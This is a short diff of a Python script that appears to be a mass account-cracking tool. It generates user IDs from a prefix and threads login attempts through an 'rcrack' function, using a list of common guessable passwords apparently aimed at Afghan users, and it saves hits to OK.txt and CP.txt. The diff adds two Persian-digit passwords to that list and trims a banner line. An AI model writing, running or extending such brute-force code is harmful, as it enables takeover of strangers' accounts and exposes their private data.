@@ -172,7 +172,7 @@ logo=("""
 		
 
 def lines():
-	print(f'\033[0;95m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[1;37') 
+	print(f'\033[0;95m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[1;37') 
  
 loop = 0
 oks = []
@@ -294,7 +294,7 @@ def m1():
         lines()
         for guru in user:
             uid = kode+guru
-            pwx=[guru+guru,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000']
+            pwx=[guru+guru,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000','۱٠٠۲٠٠','۱٠٠٠۲٠٠']
             yaari.submit(rcrack,uid,pwx,tl)
     print(46*'-')
     print('IDZ SAVED IN OK.txt : CP.txt')
